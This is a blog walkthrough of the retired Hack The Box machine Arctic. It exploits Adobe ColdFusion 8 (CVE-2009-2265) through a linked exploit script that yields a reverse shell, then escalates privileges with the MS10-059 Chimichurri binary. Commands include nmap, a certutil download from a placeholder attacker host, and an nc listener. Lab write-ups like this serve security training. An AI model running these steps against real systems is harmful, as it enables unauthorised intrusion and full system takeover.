---
layout: post
title: 'Arctic - HTB Walkthrough'
date: 2026-03-07 18:44:49 +0000
categories: [cybersecurity]
tags:
  - hackthebox
  - writeup
description: "Arctic is a retired Hack The Box machine that highlights the dangers of outdated web server software and unpatched Windows kernel…"
canonical_url: "https://medium.com/@hemanthakrishnach/arctic-htb-walkthrough-b8ae68aea971"
image: "/assets/images/posts/arctic-htb-walkthrough/img-000-77fd1cff.png"
---

Arctic is a retired Hack The Box machine that highlights the dangers of outdated web server software and unpatched Windows kernel…

---

### Arctic — HTB Walkthrough

![image](/assets/images/posts/arctic-htb-walkthrough/img-000-77fd1cff.png)

Arctic is a retired Hack The Box machine that highlights the dangers of outdated web server software and unpatched Windows kernel vulnerabilities. This guide covers the process from initial enumeration to gaining root access.

Room Link: <https://app.hackthebox.com/machines/Arctic>

### Reconnaissance

Starting with a full port scan:
```bash
nmap -T4 -p- -A <MACHINE_IP>
```
![image](/assets/images/posts/arctic-htb-walkthrough/img-001-89397a3c.png)

**Nmap Scan Results:**

- **Port 135/tcp:** Microsoft Windows RPC- **Port 8500/tcp:** JRun Web Server- **Port 49154/tcp:** Microsoft Windows RPC

The OS fingerprint suggests Windows Server 2008 R2 / Windows 7 (64-bit). The interesting service here is the JRun Web Server on port **8500**.

### Web Enumeration

Browsing to <MACHINE\_IP> reveals a directory listing with two folders:![image](/assets/images/posts/arctic-htb-walkthrough/img-002-d8e5aaa8.png)

Navigating to `cfdocs/dochome.htm` confirms the server is running **Adobe ColdFusion 8** — an old and well-known vulnerable version.![image](/assets/images/posts/arctic-htb-walkthrough/img-003-02c40714.png)

### Initial Foothold — CVE-2009–2265 (RCE)

Adobe ColdFusion 8 is vulnerable to an unauthenticated file upload that leads to remote code execution.

**Exploit:** <https://www.exploit-db.com/exploits/50057>![image](/assets/images/posts/arctic-htb-walkthrough/img-004-3898c6a5.png)

Download the exploit script and update the connection parameters:

Before running the exploit, we must modify the configuration values:

- **LHOST** — our attack machine IP- **LPORT** — listener port- **RPORT** — target service port

After updating these parameters in the exploit script, we prepare to receive a reverse shell.![image](/assets/images/posts/arctic-htb-walkthrough/img-005-04c02488.png)

Run the exploit:
```typescript
python3 50057.py
```

The script generates a JSP payload, uploads it via the vulnerable file upload endpoint, then executes it — catching a reverse shell on port 4444:![image](/assets/images/posts/arctic-htb-walkthrough/img-006-d5addba5.png)![image](/assets/images/posts/arctic-htb-walkthrough/img-007-ecd6f1bb.png)

### User Flag

Navigate to the user’s Desktop and read the flag:
```bash
cd C:\Users\tolis\Desktoptype user.txt
```
![image](/assets/images/posts/arctic-htb-walkthrough/img-008-938e05f5.png)

### Privilege Escalation

#### [Windows Exploit Suggester](https://github.com/strozfriedberg/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)

Collect system information using *systeminfo* and feed it to `windows-exploit-suggester.`
```bash
python2 windows-exploit-suggester.py --database 2026–03–02-mssb.xls --systeminfo sysinfo.txt
```

Among the results, **MS10–059** stands out:![image](/assets/images/posts/arctic-htb-walkthrough/img-009-ddcd1882.png)

### Exploiting MS10–059 (Chimichurri)

Download the pre-compiled binary from:

[**windows-kernel-exploits/MS10-059: Chimichurri/Compiled at master · egre55/windows-kernel-exploits**\
*Windows Kernel Exploits. Contribute to egre55/windows-kernel-exploits development by creating an account on GitHub.*github.com](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri/Compiled "https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri/Compiled")

Transfer to the target:
```cpp
certutil -urlcache -f http://<ATTCKER_IP>/Chimichurri.exe Chimichurri.exe
```
![image](/assets/images/posts/arctic-htb-walkthrough/img-010-ee80820c.png)

Set up a listener on the attacker machine:
```bash
nc -lvnp 9999
```

Execute the exploit, pointing the callback to the attacker:![image](/assets/images/posts/arctic-htb-walkthrough/img-011-427cc3fb.png)

A new shell arrives:![image](/assets/images/posts/arctic-htb-walkthrough/img-012-9dbca2a8.png)

### Root Flag

```bash
cd C:/users/administrator/desktoptype root.txt
```

### Conclusion

The Arctic machine demonstrates why keeping web applications and underlying operating systems patched is critical. A decade-old ColdFusion vulnerability provided the initial foothold, and an unpatched kernel allowed for a total system takeover .

### Thanks for reading!
